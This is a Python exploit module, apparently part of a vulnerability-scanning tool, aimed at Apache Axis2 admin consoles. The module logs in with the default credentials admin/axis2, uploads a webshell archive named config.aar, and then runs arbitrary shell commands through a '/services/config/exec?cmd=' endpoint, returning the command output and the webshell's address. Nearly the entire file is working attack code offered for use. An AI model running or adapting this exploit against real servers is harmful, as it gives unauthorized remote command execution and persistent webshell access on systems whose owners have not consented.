# -*- coding:utf-8 -*-
# axis2弱密码
import re

import requests

from .. import fileUtil
from VulnScanModel.models import VulnScan
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests

class EXP:

    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def upload_aar(self, url, session):
        resp = self.requestUtil.get(url + "upload", session=session)
        token = re.findall('doUpload\?token=(.*?)"', resp.text)
        if not token == []:
            upload_path = "doUpload?token=%s" % token[0]
        else:
            upload_path = "upload"
        data = self.requestUtil.get_file_data("config.aar",
                                         fileUtil.open_file(dir="webshell", filename="config.aar", mode="rb").read())
        resp = self.requestUtil.post(url + upload_path, data=data[0], header={"Content-Type": data[1]}, session=session)
        print(resp.text)
        return True


    def login(self, url, session):
        resp = self.requestUtil.post(url + "login", data="userName=admin&password=axis2&submit=+Login+", session=session)
        return True


    def rce(self, url, cmd):
        resp = self.requestUtil.get(f"{url}/services/config/exec?cmd={cmd}", timeout=10)
        if resp.status_code != 404:
            return re.findall("<ns:return>(.*?)</ns:return>", resp.text, re.DOTALL)[0].replace("&#xd;", "\n")
        else:
            return False


    def exp(self, cmd, content=""):
        root_url = self.vuln.url + self.vuln.specify.replace("/axis2-admin/", "")
        result = self.rce(root_url, cmd)
        if not result:
            session = requests.session()
            admin_url = self.vuln.url + self.vuln.specify
            self.login(admin_url, session)
            self.upload_aar(admin_url, session)
            result = self.rce(self.vuln.url + self.vuln.specify.replace("/axis2-admin/", ""), cmd)
        return "shell地址: \n%s" % f"{root_url}/services/config\n输出结果:\n" + str(result)
